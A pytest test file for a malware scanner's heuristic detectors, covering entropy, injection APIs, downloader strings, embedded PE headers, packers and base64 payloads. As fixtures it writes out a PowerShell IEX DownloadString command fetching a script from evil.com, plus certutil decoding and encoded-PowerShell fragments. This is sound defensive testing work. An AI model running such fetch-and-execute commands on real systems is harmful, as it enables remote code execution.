"""
Aegis Node — Heuristic Malware Detection Tests.

Tests scanner/heuristics.py individually and integrated via engine.run_scan().

Coverage:
  - calculate_entropy()          — pure math correctness
  - HEUR-001  high-entropy file  — random bytes / compressed data
  - HEUR-001  low-entropy file   — clean text (no finding)
  - HEUR-002  non-printable byte ratio in text-extension file
  - HEUR-003  process injection API strings
  - HEUR-004  PowerShell downloader / LOLBIN strings
  - HEUR-005  embedded PE (MZ+PE past offset 512)
  - HEUR-006  packer section names (.UPX0, .aspack)
  - HEUR-008  dense base64 block with high entropy
  - heuristic_scan() on clean CSV — zero findings expected
  - heuristic_scan() on EICAR bytes — entropy check
  - engine.run_scan() integration — heuristic findings in result
  - ENABLE_HEURISTICS=false disables Stage 0.5
  - risk_score aggregation with heuristics
  - tiny file skip (< 64 bytes)

Run with:  pytest tests/test_heuristics.py -v
"""

from __future__ import annotations

import math
import os
import tempfile
from pathlib import Path

import pytest

# ── Path bootstrap ────────────────────────────────────────────────────────────
import sys
_SCANNER = Path(__file__).resolve().parent.parent / "scanner"
_BACKEND = Path(__file__).resolve().parent.parent / "backend"
sys.path.insert(0, str(_SCANNER))
sys.path.insert(0, str(_BACKEND))

from heuristics import (
    _B64_ENTROPY_THRESHOLD,
    _ENTROPY_HIGH,
    calculate_entropy,
    heuristic_scan,
)
from engine import run_scan


# ─────────────────────────────────────────────────────────────────────────────
# Helpers
# ─────────────────────────────────────────────────────────────────────────────

def _tmp(content: bytes, suffix: str = ".csv") -> Path:
    f = tempfile.NamedTemporaryFile(suffix=suffix, delete=False)
    f.write(content)
    f.close()
    return Path(f.name)


def _cleanup(p: Path) -> None:
    try:
        os.unlink(p)
    except OSError:
        pass


# ─────────────────────────────────────────────────────────────────────────────
# 1. calculate_entropy()
# ─────────────────────────────────────────────────────────────────────────────

class TestCalculateEntropy:
    def test_empty_bytes_returns_zero(self):
        assert calculate_entropy(b"") == 0.0

    def test_single_repeated_byte_entropy_is_zero(self):
        assert calculate_entropy(b"\x00" * 1000) == pytest.approx(0.0)

    def test_two_equal_bytes_entropy_is_one(self):
        data = b"\x00\xff" * 500
        assert calculate_entropy(data) == pytest.approx(1.0, abs=1e-6)

    def test_random_bytes_high_entropy(self):
        """256 distinct byte values → near-maximum entropy ~8.0."""
        data = bytes(range(256)) * 4   # 1024 bytes, uniform distribution
        entropy = calculate_entropy(data)
        assert entropy > 7.9, f"Expected ~8.0, got {entropy}"

    def test_printable_text_moderate_entropy(self):
        text = b"The quick brown fox jumps over the lazy dog. " * 20
        entropy = calculate_entropy(text)
        assert 3.0 < entropy < 6.0, f"Expected 3–6, got {entropy}"


# ─────────────────────────────────────────────────────────────────────────────
# 2. HEUR-001 — Entropy Detection
# ─────────────────────────────────────────────────────────────────────────────

class TestEntropyDetection:
    def test_high_entropy_file_flagged(self):
        """Random bytes must trigger HEUR-001 (high entropy)."""
        import os as _os
        data = _os.urandom(4096)
        path = _tmp(data, suffix=".bin")
        try:
            findings, score = heuristic_scan(str(path))
            rule_ids = [f.rule_id for f in findings]
            assert "HEUR-001" in rule_ids, (
                f"High-entropy random file not flagged. findings={findings}"
            )
            assert score > 0.0
        finally:
            _cleanup(path)

    def test_low_entropy_clean_text_no_heur001(self):
        """Plain text CSV must NOT trigger HEUR-001."""
        data = b"name,age,city\nAlice,30,London\nBob,25,Paris\n" * 50
        path = _tmp(data, suffix=".csv")
        try:
            findings, score = heuristic_scan(str(path))
            heur001 = [f for f in findings if f.rule_id == "HEUR-001"]
            assert not heur001, f"False positive HEUR-001 on clean CSV: {heur001}"
        finally:
            _cleanup(path)

    def test_compressed_like_data_high_entropy(self):
        """Bytes with near-uniform distribution → HEUR-001."""
        data = bytes(i % 256 for i in range(8192))
        path = _tmp(data, suffix=".csv")
        try:
            findings, _ = heuristic_scan(str(path))
            rule_ids = [f.rule_id for f in findings]
            assert "HEUR-001" in rule_ids
        finally:
            _cleanup(path)


# ─────────────────────────────────────────────────────────────────────────────
# 3. HEUR-002 — Non-printable Byte Ratio
# ─────────────────────────────────────────────────────────────────────────────

class TestNonPrintableRatio:
    def test_binary_csv_flagged(self):
        """CSV file full of binary bytes must trigger HEUR-002."""
        data = b"\x80\x90\xa0\xb0\xc0\xd0\xe0\xf0" * 512
        path = _tmp(data, suffix=".csv")
        try:
            findings, _ = heuristic_scan(str(path))
            rule_ids = [f.rule_id for f in findings]
            assert "HEUR-002" in rule_ids, f"Binary CSV not flagged HEUR-002. rules={rule_ids}"
        finally:
            _cleanup(path)

    def test_binary_bin_file_not_flagged_heur002(self):
        """Binary-extension file should NOT trigger HEUR-002 (binary is expected)."""
        data = b"\x80\x90\xa0\xb0" * 512
        path = _tmp(data, suffix=".bin")
        try:
            findings, _ = heuristic_scan(str(path))
            heur002 = [f for f in findings if f.rule_id == "HEUR-002"]
            assert not heur002, "HEUR-002 should not fire for .bin extension"
        finally:
            _cleanup(path)


# ─────────────────────────────────────────────────────────────────────────────
# 4. HEUR-003 — Process Injection API Strings
# ─────────────────────────────────────────────────────────────────────────────

class TestProcessInjectionDetection:
    def test_create_remote_thread_flagged(self):
        # Pad to > 64 bytes (heuristics skip files smaller than _MIN_BYTES=64)
        data = b"normal data\x00CreateRemoteThread\x00VirtualAllocEx\x00more data" + b"\x00" * 50
        assert len(data) >= 64
        path = _tmp(data, suffix=".bin")
        try:
            findings, _ = heuristic_scan(str(path))
            rule_ids = [f.rule_id for f in findings]
            assert "HEUR-003" in rule_ids, f"Process injection API not detected. rules={rule_ids}"
        finally:
            _cleanup(path)

    def test_write_process_memory_flagged(self):
        data = b"\x00" * 100 + b"WriteProcessMemory" + b"\x00" * 100
        path = _tmp(data, suffix=".bin")
        try:
            findings, _ = heuristic_scan(str(path))
            rule_ids = [f.rule_id for f in findings]
            assert "HEUR-003" in rule_ids
        finally:
            _cleanup(path)

    def test_clean_file_no_heur003(self):
        data = b"name,score\nAlice,100\nBob,200\n"
        path = _tmp(data, suffix=".csv")
        try:
            findings, _ = heuristic_scan(str(path))
            heur003 = [f for f in findings if f.rule_id == "HEUR-003"]
            assert not heur003, f"False positive HEUR-003: {heur003}"
        finally:
            _cleanup(path)


# ─────────────────────────────────────────────────────────────────────────────
# 5. HEUR-004 — Script-Based Downloader Strings
# ─────────────────────────────────────────────────────────────────────────────

class TestDownloaderDetection:
    def test_powershell_enc_flagged(self):
        data = b"powershell -enc JABzAD0ATgBlAHcALQBPAGIA" + b"A" * 200
        path = _tmp(data, suffix=".txt")
        try:
            findings, _ = heuristic_scan(str(path))
            rule_ids = [f.rule_id for f in findings]
            assert "HEUR-004" in rule_ids, f"PS encoded command not detected. rules={rule_ids}"
        finally:
            _cleanup(path)

    def test_iex_download_string_flagged(self):
        data = b"IEX (New-Object Net.WebClient).DownloadString('http://evil.com/shell.ps1')"
        path = _tmp(data, suffix=".txt")
        try:
            findings, _ = heuristic_scan(str(path))
            rule_ids = [f.rule_id for f in findings]
            assert "HEUR-004" in rule_ids, f"IEX DownloadString not detected. rules={rule_ids}"
        finally:
            _cleanup(path)

    def test_certutil_decode_flagged(self):
        # certutil -decode must appear in a file large enough to pass _MIN_BYTES=64
        data = b"certutil -decode encoded.b64 output.exe" + b" " * 64
        assert len(data) >= 64
        path = _tmp(data, suffix=".txt")
        try:
            findings, _ = heuristic_scan(str(path))
            rule_ids = [f.rule_id for f in findings]
            assert "HEUR-004" in rule_ids, f"certutil -decode not detected. rules={rule_ids}"
        finally:
            _cleanup(path)


# ─────────────────────────────────────────────────────────────────────────────
# 6. HEUR-005 — Embedded PE Header (Polyglot)
# ─────────────────────────────────────────────────────────────────────────────

class TestEmbeddedPEDetection:
    def test_embedded_pe_with_valid_signature_flagged(self):
        """MZ + valid PE\x00\x00 signature at offset 0x40 embedded past byte 512."""
        # Build a minimal valid PE stub:
        # MZ header with e_lfanew pointing to PE signature
        mz_stub = bytearray(0x80)
        mz_stub[0:2] = b"MZ"
        mz_stub[0x3C:0x40] = (0x40).to_bytes(4, "little")  # e_lfanew = 0x40
        mz_stub[0x40:0x44] = b"PE\x00\x00"

        data = b"CSV header,col1\n" + b"data," * 128 + bytes(mz_stub)
        path = _tmp(data, suffix=".csv")
        try:
            findings, _ = heuristic_scan(str(path))
            rule_ids = [f.rule_id for f in findings]
            assert "HEUR-005" in rule_ids, (
                f"Embedded PE not detected as HEUR-005. rules={rule_ids}"
            )
        finally:
            _cleanup(path)

    def test_file_starting_with_mz_no_heur005(self):
        """File that starts with MZ (caught by MAL-002) should NOT fire HEUR-005."""
        data = b"MZ\x90\x00" + b"\x00" * 200
        path = _tmp(data, suffix=".bin")
        try:
            findings, _ = heuristic_scan(str(path))
            heur005 = [f for f in findings if f.rule_id == "HEUR-005"]
            assert not heur005, "HEUR-005 should not fire for file starting with MZ"
        finally:
            _cleanup(path)


# ─────────────────────────────────────────────────────────────────────────────
# 7. HEUR-006 — Packer Section Names
# ─────────────────────────────────────────────────────────────────────────────

class TestPackerDetection:
    def test_upx_sections_flagged(self):
        data = b"MZ\x90\x00" + b"\x00" * 100 + b".UPX0\x00\x00\x00" + b".UPX1\x00\x00\x00"
        path = _tmp(data, suffix=".bin")
        try:
            findings, _ = heuristic_scan(str(path))
            rule_ids = [f.rule_id for f in findings]
            assert "HEUR-006" in rule_ids, f"UPX packer sections not detected. rules={rule_ids}"
        finally:
            _cleanup(path)

    def test_aspack_section_flagged(self):
        data = b"\x00" * 64 + b".aspack\x00" + b"\x00" * 64
        path = _tmp(data, suffix=".bin")
        try:
            findings, _ = heuristic_scan(str(path))
            rule_ids = [f.rule_id for f in findings]
            assert "HEUR-006" in rule_ids
        finally:
            _cleanup(path)


# ─────────────────────────────────────────────────────────────────────────────
# 8. HEUR-008 — Dense Base64 Payload
# ─────────────────────────────────────────────────────────────────────────────

class TestBase64PayloadDetection:
    def test_high_entropy_b64_block_flagged(self):
        """Dense base64 block with high entropy should trigger HEUR-008."""
        # Generate 200 chars of varied base64 characters with decent entropy
        import random
        import string
        rng = random.Random(42)
        b64_chars = string.ascii_letters + string.digits + "+/"
        b64_block = "".join(rng.choice(b64_chars) for _ in range(200)).encode()
        data = b"name,payload\ntest," + b64_block + b"\n"
        path = _tmp(data, suffix=".csv")
        try:
            findings, _ = heuristic_scan(str(path))
            rule_ids = [f.rule_id for f in findings]
            assert "HEUR-008" in rule_ids, (
                f"Base64 payload not detected as HEUR-008. rules={rule_ids}"
            )
        finally:
            _cleanup(path)

    def test_repeated_single_char_b64_no_finding(self):
        """Low-entropy base64 (repeated chars) should NOT trigger HEUR-008."""
        data = b"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" * 4
        path = _tmp(data, suffix=".csv")
        try:
            findings, _ = heuristic_scan(str(path))
            heur008 = [f for f in findings if f.rule_id == "HEUR-008"]
            assert not heur008, f"False positive HEUR-008: {heur008}"
        finally:
            _cleanup(path)


# ─────────────────────────────────────────────────────────────────────────────
# 9. Clean File — Zero Heuristic Findings
# ─────────────────────────────────────────────────────────────────────────────

class TestCleanFileNoHeuristics:
    def test_clean_csv_no_heuristic_findings(self):
        """Benign CSV must produce zero heuristic findings and score=0."""
        data = b"name,age,city\nAlice,30,London\nBob,25,Paris\nCharlie,35,Tokyo\n"
        path = _tmp(data, suffix=".csv")
        try:
            findings, score = heuristic_scan(str(path))
            assert findings == [], f"False positives on clean CSV: {findings}"
            assert score == 0.0
        finally:
            _cleanup(path)

    def test_tiny_file_skipped(self):
        """Files smaller than 64 bytes should be skipped (no findings)."""
        data = b"a,b\n1,2\n"
        assert len(data) < 64
        path = _tmp(data, suffix=".csv")
        try:
            findings, score = heuristic_scan(str(path))
            assert findings == []
            assert score == 0.0
        finally:
            _cleanup(path)


# ─────────────────────────────────────────────────────────────────────────────
# 10. EICAR + Heuristics Combined
# ─────────────────────────────────────────────────────────────────────────────

class TestEicarWithHeuristics:
    def test_eicar_bytes_entropy_moderate(self):
        """EICAR string entropy should be moderate (not trigger HEUR-001) but
        the file is caught by raw_bytes_scan MAL-001 in content_checker."""
        eicar = b"X5O!P%@AP[4\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*"
        entropy = calculate_entropy(eicar)
        # EICAR has moderate entropy ~5.0, not high enough to trigger HEUR-001
        assert entropy < _ENTROPY_HIGH, f"Unexpected EICAR entropy {entropy}"

    def test_eicar_in_csv_full_pipeline_malicious(self):
        """EICAR in CSV must produce malicious verdict from full pipeline."""
        eicar = b"X5O!P%@AP[4\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*"
        data = b"filename,content\ntest.csv," + eicar + b"\n"
        path = _tmp(data, suffix=".csv")
        try:
            result = run_scan(str(path))
            assert result.verdict in ("malicious", "suspicious"), (
                f"EICAR file not flagged. verdict={result.verdict} "
                f"findings={result.to_findings_dicts()}"
            )
        finally:
            _cleanup(path)


# ─────────────────────────────────────────────────────────────────────────────
# 11. Engine Integration Tests
# ─────────────────────────────────────────────────────────────────────────────

class TestEngineHeuristicIntegration:
    def test_heuristic_findings_in_scan_result(self):
        """run_scan result must expose heuristic_findings field."""
        import os as _os
        data = _os.urandom(2048)
        path = _tmp(data, suffix=".bin")
        try:
            result = run_scan(str(path))
            assert hasattr(result, "heuristic_findings")
            assert hasattr(result, "heuristic_risk_score")
            assert isinstance(result.heuristic_findings, list)
            assert isinstance(result.heuristic_risk_score, float)
        finally:
            _cleanup(path)

    def test_random_bytes_file_verdict_suspicious_or_malicious(self):
        """Random bytes file must be at least suspicious via heuristics."""
        import os as _os
        data = _os.urandom(4096)
        path = _tmp(data, suffix=".bin")
        try:
            result = run_scan(str(path))
            assert result.verdict in ("suspicious", "malicious"), (
                f"Random bytes file verdict was '{result.verdict}' — expected suspicious/malicious"
            )
            assert result.threats_found_count > 0
        finally:
            _cleanup(path)

    def test_all_findings_property(self):
        """ScanEngineResult.all_findings combines heuristic + content findings."""
        data = b"name,age\nAlice,30\nBob,25\n" * 5
        path = _tmp(data, suffix=".csv")
        try:
            result = run_scan(str(path))
            all_f = result.all_findings
            assert isinstance(all_f, list)
            # all_findings = heuristic_findings + content_findings
            assert len(all_f) == len(result.heuristic_findings) + len(result.content_findings)
        finally:
            _cleanup(path)

    def test_heuristic_findings_in_to_findings_dicts(self):
        """to_findings_dicts() must include heuristic findings with HEUR- prefix."""
        import os as _os
        data = _os.urandom(2048)
        path = _tmp(data, suffix=".bin")
        try:
            result = run_scan(str(path))
            dicts = result.to_findings_dicts()
            heur_dicts = [d for d in dicts if d["rule_id"].startswith("HEUR-")]
            # If heuristics fired, they must appear in dicts
            if result.heuristic_findings:
                assert heur_dicts, "HEUR- findings missing from to_findings_dicts()"
        finally:
            _cleanup(path)

    def test_clean_scan_verdict_still_clean(self):
        """Clean CSV must stay verdict=clean — heuristics must not cause false positive."""
        data = b"product,price,stock\nApple,1.20,500\nBanana,0.50,300\n" * 10
        path = _tmp(data, suffix=".csv")
        try:
            result = run_scan(str(path))
            assert result.verdict == "clean", (
                f"False positive on clean CSV: verdict={result.verdict} "
                f"heuristics={result.heuristic_findings}"
            )
        finally:
            _cleanup(path)


# ─────────────────────────────────────────────────────────────────────────────
# 12. ENABLE_HEURISTICS=false Disables Stage 0.5
# ─────────────────────────────────────────────────────────────────────────────

class TestHeuristicsDisableFlag:
    def test_heuristics_disabled_returns_empty(self, monkeypatch):
        """Setting ENABLE_HEURISTICS=false must return no findings."""
        import os as _os
        monkeypatch.setenv("ENABLE_HEURISTICS", "false")
        data = _os.urandom(4096)
        path = _tmp(data, suffix=".bin")
        try:
            findings, score = heuristic_scan(str(path))
            assert findings == [], f"Heuristics should be disabled: {findings}"
            assert score == 0.0
        finally:
            _cleanup(path)
            monkeypatch.delenv("ENABLE_HEURISTICS", raising=False)

    def test_heuristics_re_enabled_after_env_reset(self, monkeypatch):
        """After removing ENABLE_HEURISTICS=false, heuristics must work again."""
        import os as _os
        monkeypatch.setenv("ENABLE_HEURISTICS", "true")
        data = _os.urandom(4096)
        path = _tmp(data, suffix=".bin")
        try:
            findings, score = heuristic_scan(str(path))
            # random bytes should trigger at least HEUR-001
            assert "HEUR-001" in [f.rule_id for f in findings]
        finally:
            _cleanup(path)
